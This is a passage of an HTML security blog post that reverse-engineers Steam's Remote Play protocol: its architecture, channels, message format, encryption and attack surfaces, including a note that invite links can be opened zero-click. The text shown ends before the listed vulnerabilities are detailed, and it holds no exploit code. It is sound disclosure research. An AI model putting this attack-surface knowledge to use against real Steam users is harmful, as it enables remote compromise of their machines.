<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=author content="Thalium Team"><meta name=description content="Thalium blog."><meta name=keywords content="blog,tech"><meta name=viewport content="width=device-width,minimum-scale=1,initial-scale=1"><meta name=generator content="Hugo 0.122.0"><link rel=canonical href=/posts/achieving-remote-code-execution-in-steam-remote-play/><meta property="og:title" content="Achieving Remote Code Execution in Steam: a journey into the Remote Play protocol"><meta property="og:description" content="Remote Play Together, developed by Valve, allows sharing local multi-player games with friends over the network through streaming. The associated protocol is elaborate enough to shelter a valuable attack surface that has scarcely been ventured into in the past.
This post covers the reverse engineering of the protocol and client/server implementations inside Steam, before presenting a dedicated fuzzer that unveiled a few critical vulnerabilities.
"><meta property="og:type" content="article"><meta property="og:url" content="/posts/achieving-remote-code-execution-in-steam-remote-play/"><meta property="og:image" content="https://blog.thalium.re/posts/img/remoteplay/banner.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-12-04T08:00:00+00:00"><meta property="article:modified_time" content="2023-12-04T08:00:00+00:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://blog.thalium.re/posts/img/remoteplay/banner.png"><meta name=twitter:title content="Achieving Remote Code Execution in Steam: a journey into the Remote Play protocol"><meta name=twitter:description content="Remote Play Together, developed by Valve, allows sharing local multi-player games with friends over the network through streaming. The associated protocol is elaborate enough to shelter a valuable attack surface that has scarcely been ventured into in the past.
This post covers the reverse engineering of the protocol and client/server implementations inside Steam, before presenting a dedicated fuzzer that unveiled a few critical vulnerabilities.
"><meta itemprop=name content="Achieving Remote Code Execution in Steam: a journey into the Remote Play protocol"><meta itemprop=description content="Remote Play Together, developed by Valve, allows sharing local multi-player games with friends over the network through streaming. The associated protocol is elaborate enough to shelter a valuable attack surface that has scarcely been ventured into in the past.
This post covers the reverse engineering of the protocol and client/server implementations inside Steam, before presenting a dedicated fuzzer that unveiled a few critical vulnerabilities.
"><meta itemprop=datePublished content="2023-12-04T08:00:00+00:00"><meta itemprop=dateModified content="2023-12-04T08:00:00+00:00"><meta itemprop=wordCount content="9473"><meta itemprop=image content="https://blog.thalium.re/posts/img/remoteplay/banner.png"><meta itemprop=keywords content="Reverse Engineering,Vulnerability Research,RCE,"><link rel=stylesheet href=/css/layout.css><link rel=stylesheet href=/css/default-dark.css><link rel=icon href=/favicon.ico><script>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-141692648-1","auto"),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script><title>Achieving Remote Code Execution in Steam: a journey into the Remote Play protocol
</title><script>MathJax={tex:{inlineMath:[["∳","∳"]],displayMath:[["∳∳","∳∳"]],processEscapes:!0},svg:{fontCache:"global"}}</script><script type=text/javascript id=MathJax-script async src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-svg.js></script></head><body><style>@font-face{font-family:days_one;src:url(/days_one.ttf)format('truetype')}.siteTitle{margin-top:24px}.siteTitle img{display:inline-block;vertical-align:middle;margin-top:-24px;margin-right:-10px}.siteTitle span{font-family:days_one,Fallback,sans-serif;color:#fff;font-size:160%}</style><div class=main><header><div class=header-bar><nav><div class=siteTitle><a href=/><img src=/shard_only_no_background.png width=12%></img>
<span>THALIUM</span></a></div><a class=nav-item href=/posts/><div class=nav-item-title>Posts</div></a><a class=nav-item href=/joinus/><div class=nav-item-title>Join Us</div></a><a class=nav-item href=/about/><div class=nav-item-title>About</div></a></nav><div class=social-links-header><a href=mailto:contact@thalium.re><div class=social-link>Email</div></a><a href=https://github.com/thalium target=_blank><div class=social-link>Github</div></a><a href=https://twitter.com/thalium_team target=_blank><div class=social-link>Twitter</div></a></div></div></header><article class=post><h1 class=title>Achieving Remote Code Execution in Steam: a journey into the Remote Play protocol</h1><div class=content><p>Valve, the company behind the widespread videogame platform Steam, released in 2019 a feature called <em>Remote Play Together</em>. It allows sharing local multi-player games with friends over the network through streaming.</p><p>The protocol associated with the Remote Play technology is elaborate enough to give rise to stimulating attack scenarios, and in the past its surface has scarcely been ventured into.</p><p>In this post, we will cover the reverse engineering of the protocol and its implementations within Steam (client and server), before going through a few vulnerabilities that were found with the help of a dedicated fuzzer.</p><blockquote><p>Note: this work was presented at SSTIC 2023 — you can find the talk and the slides <a href=https://www.sstic.org/2023/presentation/bug_hunting_in_steam_remote_play/>here</a>. This post aims at giving a little bit more insight and figuring in some new elements of research that could not be showcased back then.</p><p><strong>In particular, we will discuss a critical Remote Code Execution vulnerability targeting the <em>streaming client</em> component.</strong></p></blockquote><h3 id=table-of-contents>Table of Contents</h3><ul><li><a href=#introduction>Introduction</a><ul><li><a href=#context-and-target>Context and target</a></li><li><a href=#steam-remote-play>Steam Remote Play</a></li></ul></li><li><a href=#study-of-the-remote-play-implementations-in-steam>Study of the Remote Play implementations in Steam</a><ul><li><a href=#software-architecture>Software architecture</a></li><li><a href=#reverse-engineering-the-protocol>Reverse engineering the protocol</a><ul><li><a href=#network-reception-logic-and-processing>Network reception logic and processing</a></li><li><a href=#channel-system>Channel system</a></li><li><a href=#message-format>Message format</a></li><li><a href=#processing-of-control-messages-and-cryptography>Processing of control messages and cryptography</a></li><li><a href=#connection-sequence-diagram>Connection sequence diagram</a></li></ul></li></ul></li><li><a href=#main-attack-surfaces>Main attack surfaces</a><ul><li><a href=#control-messages>Control messages</a></li><li><a href=#remote-hid>Remote HID</a></li><li><a href=#audiovideo-data>Audio/video data</a></li></ul></li><li><a href=#implementing-a-custom-client-and-server>Implementing a custom client and server</a><ul><li><a href=#choice-of-transport-mode>Choice of transport mode</a></li><li><a href=#server-reimplementation>Server reimplementation</a></li><li><a href=#client-reimplementation>Client reimplementation</a></li></ul></li><li><a href=#implementing-a-dedicated-fuzzer>Implementing a dedicated fuzzer</a><ul><li><a href=#rpfuzz-a-fuzzer-for-the-remote-play-protocol><code>rpfuzz</code>: a fuzzer for the Remote Play protocol</a></li><li><a href=#pbfuzz-a-custom-protobuf-mutation-engine><code>pbfuzz</code>: a custom Protobuf mutation engine</a></li><li><a href=#fuzzing-results-and-crash-analysis>Fuzzing results and crash analysis</a></li></ul></li><li><a href=#vulnerabilities>Vulnerabilities</a><ul><li><a href=#path-traversal-file-write-in-csettouchicondatamsg>Path traversal file write in <code>CSetTouchIconDataMsg</code></a></li><li><a href=#format-string-bugs-in-cremoteplaytogethergroupupdatemsg>Format string bugs in <code>CRemotePlayTogetherGroupUpdateMsg</code></a></li><li><a href=#request-forgery-in-cremoteplaytogethergroupupdatemsg>Request forgery in <code>CRemotePlayTogetherGroupUpdateMsg</code></a></li><li><a href=#oob-access-in-cremoteplaytogethergroupupdatemsg>OOB access in <code>CRemotePlayTogetherGroupUpdateMsg</code></a></li><li><a href=#heap-overflow-in-yv12-video-frames>Heap overflow in YV12 video frames</a></li><li><a href=#heap-overflow-in-cremotehidmsg-gamepad-logic>Heap overflow in <code>CRemoteHIDMsg</code> gamepad logic</a></li></ul></li><li><a href=#timeline>Timeline</a></li><li><a href=#conclusion>Conclusion</a></li></ul><h1 id=introduction>Introduction</h1><h2 id=context-and-target>Context and target</h2><p>More than a billion people around the world play online videogames on various platforms: Windows, Linux, macOS, Android, iOS, gaming consoles, VR headsets and more.</p><p>Online multiplayer games are also massive binaries with a large attack surface (network, gaming logic, graphics, sound, maps&mldr;). They are thus great targets for remote hackers, who can seek to exploit vulnerabilities in game clients or servers to fulfill various purposes: cheating, harvesting credentials, spreading malware, cryptomining, or even targeted surveillance.</p><p>Valve is a well-known game developer, editor and publisher. They have created many popular games, like Half-Life, Counter-Strike and Portal, as well as a game engine called the <em>Source Engine</em>. They seemed a nice target as they run a bug bounty program on HackerOne with many <a href=https://hackerone.com/valve/hacktivity>public reports</a>. These can give great inspiration for attack surfaces and exploitation techniques related to Valve products.</p><p>Several people have already successfully discovered RCEs in games such as CS:GO, or inside the Source Engine. However, it seemed to me that less people have tried reverse engineering and finding vulnerabilities inside the Steam client itself, hence why I decided to take a look at it.</p><p>Steam is a software application developed by Valve and without a doubt the most widely used video game platform. It centralizes and distributes dozens of thousands of games, while holding a myriad of features related to social networking, game integration, streaming, inventories, markets, workshops, etc. In 2020, Steam reported <a href=https://store.steampowered.com/news/group/4145017/view/2961646623386540826>62M daily active users</a>.</p><p>Here is an attempt to briefly summarize potential levels or layers of attack surfaces within Valve products:</p><p><a href=/posts/img/remoteplay/valve-products-1.png target=_blank><img src=/posts/img/remoteplay/valve-products-1.png alt="Attack surfaces on Valve products"></a></p><p>The <a href=https://partner.steamgames.com/doc/home>Steamworks API</a> is a software development kit targeted towards game developers to integrate Steam features into their games: matchmaking, leaderboards, Steam Workshop, friends, invites and many more. This is a valuable attack surface as well as it can be a common vector in many games. For instance, in 2021, <a href=https://hackerone.com/reports/1180252>slidybat reported a stack buffer overflow</a> in the <code>DecompressVoice</code> method that impacted games with voice communications, like CS:GO.</p><p>However, delving into the public reports, I never found mention of a particularly interesting component in the Steam client: <a href=https://store.steampowered.com/remoteplay>Steam Remote Play</a>.</p><p><a href=/posts/img/remoteplay/steam-remote-play.png target=_blank><img src=/posts/img/remoteplay/steam-remote-play.png alt="Steam Remote Play"></a></p><h2 id=steam-remote-play>Steam Remote Play</h2><p>Steam Remote Play actually exists under various forms. It began with <a href=https://store.steampowered.com/app/353380/Steam_Link/>Steam Link</a>, released in 2015. Initially a set-top box, its hardware version was discontinued in 2018 to make way for a software-based version, also sometimes called <em>Steam In-Home Streaming</em>.</p><p><a href=/posts/img/remoteplay/steam-link-logo.png target=_blank><img src=/posts/img/remoteplay/steam-link-logo.png alt="Steam Link"></a></p><p>Steam Link allows one to stream a game from their computer, usually a gaming rig, to another (typically less powerful) device, like a smartphone, a tablet or a TV. Consequently, there are Steam Link clients for Windows, Linux, Android and iOS.</p><p>In 2019, Valve then introduced <em>Remote Play Together</em>, allowing players to share local multi-player games with their friends over the network through streaming. The player who streams the game, called the <em>host</em>, only has to send an invite link to another player, the <em>guest</em> (who does not need to own the game). The guest may send inputs (mouse, keyboard, controller&mldr;) to play together with the host if they are granted permission to.</p><p>Unsurprisingly, the protocol behind Steam Link and Remote Play Together is the same, so both products can be analyzed in order to reverse engineer the protocol. In terms of attack scenarios, Remote Play Together is however a more promising target.</p><p><a href=/posts/img/remoteplay/remote-play-interaction.png target=_blank><img src=/posts/img/remoteplay/remote-play-interaction.png alt="Remote Play interaction"></a></p><p>Indeed, host and guest are connected through a peer-to-peer link (or through a transparent relay), meaning no third party will verify, filter or alter messages from host to guest and conversely. Moreover, both host-to-guest and guest-to-host attack scenarios are worth considering and interesting to investigate. Note that throughout this post, the terms <em>client</em> and <em>guest</em> will be used interchangeably, as well as the terms <em>server</em> and <em>host</em>.</p><p>Based on this information, two main attack scenarios against Remote Play Together can be thought of:</p><ol><li>escaping the &ldquo;game sandbox&rdquo; to gain <em>graphical</em> remote access to the host&rsquo;s desktop (client-side attackers only);</li><li>exploiting vulnerabilities such as memory corruption to achieve RCE or info leak (for both client and server-side attackers).</li></ol><p>We didn&rsquo;t delve into the first one at all, because it seemed that reversing the streaming, sandboxing and access control logic would prove harder than homing in on finding bugs in protocol parsing and message processing (maybe it&rsquo;s not, who knows!).</p><p>In addition, the latter accommodates better to fuzzing techniques, and can target both the client and the server implementations — thus this is what this post will focus on.</p><p>Both host-to-guest and guest-to-host attack scenarios are worth investigating, but it is important to notice that vulnerabilities in Remote Play Together have a stronger impact for <em>guest</em> players, as a client victim:</p><ul><li>does not need to own any particular game on Steam;</li><li>does not need to be friends with the attacker on Steam (anyone can open an invite link);</li><li>automatically connects to the Remote Play server upon the link being opened (no further user interaction or confirmation).</li></ul><blockquote><p>An invite link can even be opened without any user interaction under certain circumstances: for instance, if a <code>steam://</code> wrapper is hidden inside an iframe on a web page hosted on a trusted domain (see <a href=https://hackerone.com/reports/470520>this report</a>). This can turn a whole remote code execution zero-click!</p></blockquote><p><em>NB: we chose to focus on the Windows binaries, because those are the most popular and vulnerabilities in them would impact the most people.</em></p><h1 id=study-of-the-remote-play-implementations-in-steam>Study of the Remote Play implementations in Steam</h1><h2 id=software-architecture>Software architecture</h2><p>Remote Play involves two main binaries: <code>streaming_client.exe</code>, spawned by Steam upon joining a session and which contains all of the client logic, and <code>SteamUI.dll</code>, where most of the server&rsquo;s logic is located. Like most of Steam, these are written in C++. Analyzing them will provide answers to questions such as how do client and server communicate, what is the packet format, where in the binaries do packets arrive, or how is audio and video data exchanged.</p><p>These rather large binaries (15MB) are exempt from any debug symbol, making the analysis much more laborious. Fortunately, there is another way.</p><p>The <strong>Steam Link client for Android</strong> (native library) curiously happens to contain a lot of debug symbols, and more especially <strong>function names</strong>. Although this may be some kind of compilation or distribution error from Valve, this is definitely a heaven-sent fact for reversers.</p><p>Therefore, even though we target Windows environments, most of the analysis for the protocol can be performed on the Android client. The following diagram shows a high-level architecture of the client implementation.</p><p><a href=/posts/img/remoteplay/high-level-architecture-client.png target=_blank><img src=/posts/img/remoteplay/high-level-architecture-client.png alt="High-level architecture of the client"></a></p><p>Some important dependencies include the Protobuf library, leveraged to serialize messages in the Remote Play protocol (and also used extensively within Valve games and Steam more generally), and SDL, which is mainly used for GUI, audio/video rendering, and interfacing with input devices (keyboard, controllers&mldr;).</p><p>At the foundation of the client lies a rather large component, the <em>Steam Networking Sockets</em> library, in charge of P2P transport. It seems to be at least partially based on Valve&rsquo;s <a href=https://github.com/ValveSoftware/GameNetworkingSockets>Game Networking Sockets (GNS)</a>, an open-source UDP connection-oriented transport layer with support of many features such as encryption and P2P.</p><p>A brief analysis suggested that Valve may use a heavily modified version of GNS. Indeed, the P2P part of GNS is based on WebRTC and the ICE protocol, but Remote Play doesn&rsquo;t seem to implement the full WebRTC stack: it mostly consists of TURN/STUN and custom encryption layers with clear deviations from GNS. It was decided not to investigate this component further because in the context of Remote Play, attack scenarios involving this library are much more complex.</p><p>As for the server implementation, its architecture is quite similar to the client&rsquo;s, without the human interface part. It is also worth noting the server implementation is part of a bigger DLL that contains lots of other Steam-related stuff that are not linked to Remote Play.</p><h2 id=reverse-engineering-the-protocol>Reverse engineering the protocol</h2><p>To get started on reverse engineering the protocol, there exists a tremendously useful <a href=https://github.com/SteamDatabase/Protobufs>Protobufs repository</a> on GitHub, maintained by the <a href=https://steamdb.info/>SteamDB project</a>. It tracks many protobuf definitions from Valve products.</p><p>More particularly, the <a href=https://github.com/SteamDatabase/Protobufs/blob/master/steam/steammessages_remoteplay.proto><code>steammessages_remoteplay.proto</code></a> file is simply put a goldmine to get started on reversing the protocol, as it includes pretty much all the message types and their fields. Of course, efforts do not stop now; there is still a lot to unpack by reversing the binaries, and the first step is to understand how packets are received and processed.</p><h3 id=network-reception-logic-and-processing>Network reception logic and processing</h3><p>The following diagram shows a high-level view of the data flow for packets that arrive from the server.</p><p><a href=/posts/img/remoteplay/network-reception.png target=_blank><img src=/posts/img/remoteplay/network-reception.png alt="Client network reception logic"></a></p><p>Having a clearer overview of this part of the architecture helps a lot, on one hand, to understand the protocol, and on the other hand, to bring out potential attack surfaces.</p><p>From this figure, we can pinpoint three main components.</p><p><strong>First</strong>, there&rsquo;s the network reception logic on the left, which depends on the chosen transport mode. It is characterized by an interface called <code>IStreamTransport</code>, which implements primitives for sending and receiving data. This way, we don&rsquo;t need to worry whether direct UDP, Steam Datagram Relays or WebRTC was used for the P2P link: all packets end up in the <code>CStreamSocket::HandlePacket</code> method at some point.</p><p><strong>Next</strong>, the purple block implements header parsing logic. The classes in this component reveal a lot of fields, mechanisms and concepts within the protocol: for example, flags, checksums (CRC32C), the existence of different packet types (<em>Connect</em>, <em>Disconnect</em>,
<em>Data</em>, <em>Ack</em>&mldr;) and a system of <em>channels</em>.</p><p><strong>Finally</strong>, after passing through different queues and systems related to reassembling and fragmentation, the packets land in <code>CStreamClients</code>&rsquo;s <code>OnStreamPacket</code> method, where they are then handled differently depending on the <em>channel</em> they are associated to.</p><h3 id=channel-system>Channel system</h3><p>Channels are an abstraction layer for the transport of parallel data, and are represented by identifiers between 0 and 31:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-protobuf data-lang=protobuf><span style=display:flex><span><span style=color:#66d9ef>enum</span> EStreamChannel {<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  k_EStreamChannelInvalid <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  k_EStreamChannelDiscovery <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  k_EStreamChannelControl <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  k_EStreamChannelStats <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  k_EStreamChannelDataChannelStart <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>}<span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>A few channels are statically allocated, the most important ones being the <em>control channel</em> (0x1) and the <em>stats channel</em> (0x2). The stats channel allows to communicate statistics, events, debug logs and screenshots. As for audio and video streams, they are dynamically allocated a data channel (0x3-0x1f) upon request from the server (or the client for microphone audio data).</p><p><a href=/posts/img/remoteplay/rp-channels.png target=_blank><img src=/posts/img/remoteplay/rp-channels.png alt="Remote Play channels (example)"></a></p><p>The control channel (0x1) is the channel that contains the most different types of messages (around a hundred). The enum <code>EStreamControlMessage</code> defines the <em>control</em> message types, which serve multifarious purposes:</p><ul><li>authenticating and negotiating upon connection;</li><li>setting audio, video or network parameters;</li><li>sending inputs (mouse, keyboard, controller, touchscreen);</li><li>sharing information about the lobby (game, players);</li><li>interacting with remote HID devices;</li><li>editing the client&rsquo;s cursor, icon, window title&mldr;</li></ul><h3 id=message-format>Message format</h3><p>The analysis of the components involved in header parsing allows to reconstruct the format of the packets that are exchanged. The following diagram is a typical example of what a control packet may look like.</p><p><a href=/posts/img/remoteplay/remote-play-message-structure.png target=_blank><img src=/posts/img/remoteplay/remote-play-message-structure.png alt="Steam Remote Play messages structure"></a></p><p>The different fields will not be described in detail as the goal of this post is not to write a specification for the protocol. I will say, though, that certain fields such as <em>Connection ID</em>, <em>Fragment</em> and <em>Packet ID</em> are very sensitive and need to be constructed carefully in order not to raise errors in the client or server and break the session.</p><h3 id=processing-of-control-messages-and-cryptography>Processing of control messages and cryptography</h3><p>Zooming on the body parsing block from the higher-level view diagram yields the following flowchart, which describes how packets are dispatched in the client based on their channel and how control messages are handled:</p><p><a href=/posts/img/remoteplay/steam-link-android-reception-zoom-body.png target=_blank><img src=/posts/img/remoteplay/steam-link-android-reception-zoom-body.png alt="Network reception logic: body parsing component"></a></p><p>Messages from the <em>control channel</em> are all encrypted, with the exception of <em>Authentication</em> and <em>Handshake</em> messages (1, 2, 6, 7). These are sent in plaintext because they are exchanged <em>before</em> the client is successfully authentified.</p><p>Before even the Remote Play session itself, client and server agree on a shared secret key, called the <em>session key</em>. How this key is agreed upon depends on the transport mode and is not relevant to our analysis — we only assume this key exists and is the one used to encrypt all messages.</p><p>Encrypted control message bodies consist of:</p><ul><li>1 byte to indicate the message type (<code>EStreamControlMessage</code> enum);</li><li>the message encrypted using the following formula, where <em>Message</em> is prefixed by an 8-byte sequence number (incremented every new control message):</li></ul><p>∳∳ \text{AES-CBC}(\text{Message}, \: \text{SessionKey}, \: \text{IV} = \text{HMAC-MD5}_{\text{SessionKey}}(\text{Message})) ∳∳</p><p>Upon reception, the session key and the IV are used to decrypt the message. Then, the IV, which also happens to be an HMAC of the message, is used to verify its integrity. Finally, the sequence number is checked. If anything goes wrong, the packet is discarded.</p><p>There is a special kind of control message called <code>CRemoteHIDMsg</code>. It is related to remote HID device interaction and will be detailed further when mentioning attack surfaces.</p><p>The treatment of all other control messages is deferred, and later on, they are dispatched one at a time to their corresponding sub-handler.</p><h3 id=connection-sequence-diagram>Connection sequence diagram</h3><p>Last but not least, here is a sequence diagram that can be reconstructed for the protocol:</p><p><a href=/posts/img/remoteplay/remote-play-sequence-diagram.png target=_blank><img src=/posts/img/remoteplay/remote-play-sequence-diagram.png alt="Sequence diagram for the Remote Play protocol"></a></p><p>Both the server and the client rely on a state machine. After connecting and performing a handshake, the client must send an <em>Authentication Request</em>. It contains an HMAC of a constant magic string (<code>"Steam In-Home Streaming"</code>) using the session key. This way, the server ensures that the client knows the session key and will be able to decrypt future messages.</p><p>Then, they exchange various settings, such as the audio/video codecs to use or whether to enable certain features, through a negotiation phase.</p><p>Once the configuration is done, the client and the server enter the <em>Streaming</em> state, where they can freely exchange control packets and audio/video data.</p><p>Although this preliminary setup sequence can be subject to bugs, the <em>Streaming</em> state is more interesting for vulnerability research as it handles more complex data and exposes a larger attack surface.</p><h1 id=main-attack-surfaces>Main attack surfaces</h1><p>We can accordingly identify three main attack surfaces inside the parsing of message bodies. Each one will be covered in more detail.</p><table><thead><tr><th>Attack surface</th><th>Client -> Server</th><th>Server -> Client</th></tr></thead><tbody><tr><td><strong>Control messages</strong></td><td>~40 message types</td><td>~50 message types</td></tr><tr><td><strong>Remote HID</strong></td><td>5 message types</td><td>12 message types</td></tr><tr><td><strong>Audio/video data</strong></td><td>Microphone</td><td>Game audio and video</td></tr></tbody></table><p>Note: there are actually two more attack surfaces, namely the connection phase and the parsing of headers (including the channel management and packet fragmentation systems). These surfaces are not very broad and were subject to manual vulnerability research. Nothing of interest was found.</p><h2 id=control-messages>Control messages</h2><p>Control messages are the broadest and perhaps most valuable attack surface in Remote Play: there are almost a hundred different types of messages split between the client and the server. As stated earlier, they are all associated to a Protobuf structure.</p><p>While some of these are rather short and straightforward, others are more intricate and good targets for vulnerability research. For instance, the following message type features strings, bytes, index fields and an array of nested sub-messages — all of which could hide bugs (out-of-bounds accesses, integer overflows&mldr;).</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-protobuf data-lang=protobuf><span style=display:flex><span><span style=color:#66d9ef>message</span> <span style=color:#a6e22e>CRemotePlayTogetherGroupUpdateMsg</span> {<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  <span style=color:#66d9ef>message</span> <span style=color:#a6e22e>Player</span> {<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>    <span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>uint32</span> accountid <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>    <span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>uint32</span> guestid <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>    <span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>bool</span> keyboard_enabled <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>    <span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>bool</span> mouse_enabled <span style=color:#f92672>=</span> <span style=color:#ae81ff>4</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>    <span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>bool</span> controller_enabled <span style=color:#f92672>=</span> <span style=color:#ae81ff>5</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>    <span style=color:#66d9ef>repeated</span> <span style=color:#66d9ef>uint32</span> controller_slots <span style=color:#f92672>=</span> <span style=color:#ae81ff>6</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>    <span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>bytes</span> avatar_hash <span style=color:#f92672>=</span> <span style=color:#ae81ff>7</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  }<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  <span style=color:#66d9ef>repeated</span> <span style=color:#f92672>.</span>CRemotePlayTogetherGroupUpdateMsg.Player players <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  <span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>int32</span> player_index <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  <span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>string</span> miniprofile_location <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  <span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>string</span> game_name <span style=color:#f92672>=</span> <span style=color:#ae81ff>4</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  <span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>string</span> avatar_location <span style=color:#f92672>=</span> <span style=color:#ae81ff>5</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>}<span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><h2 id=remote-hid>Remote HID</h2><p>Remote HID is a feature that allows the server to interact with the client&rsquo;s human interface devices, such as USB controllers. The protobuf definition for the <code>k_EStreamControlRemoteHID</code> message type is a rather enigmatic structure:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-protobuf data-lang=protobuf><span style=display:flex><span><span style=color:#66d9ef>message</span> <span style=color:#a6e22e>CRemoteHIDMsg</span> {<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  <span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>bytes</span> data <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  <span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>bool</span> active_input <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>}<span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>Reversing shows that the <code>data</code> field is actually <strong>nested serialized Protobuf data</strong>. More specifically, it is a serialized <code>CHIDMessageToRemote</code> message (for client targets) or a serialized <code>CHIDMessageFromRemote</code> message (for server targets). The definition to these messages can be found in another file, <a href=https://github.com/SteamDatabase/Protobufs/blob/master/steam/steammessages_hiddevices.proto>steammessages_hiddevices.proto</a>.</p><p>The <code>CHIDMessageToRemote</code> message looks like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-protobuf data-lang=protobuf><span style=display:flex><span><span style=color:#66d9ef>message</span> <span style=color:#a6e22e>CHIDMessageToRemote</span> {<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span> <span style=color:#75715e>// &lt;snip&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span> <span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>uint32</span> request_id <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span> <span style=color:#66d9ef>oneof</span> command {<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  <span style=color:#f92672>.</span>CHIDMessageToRemote.DeviceOpen device_open<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  <span style=color:#f92672>.</span>CHIDMessageToRemote.DeviceClose device_close<span style=color:#f92672>=</span><span style=color:#ae81ff>3</span>;<span style=color:#960050;background-color:#1e0010>
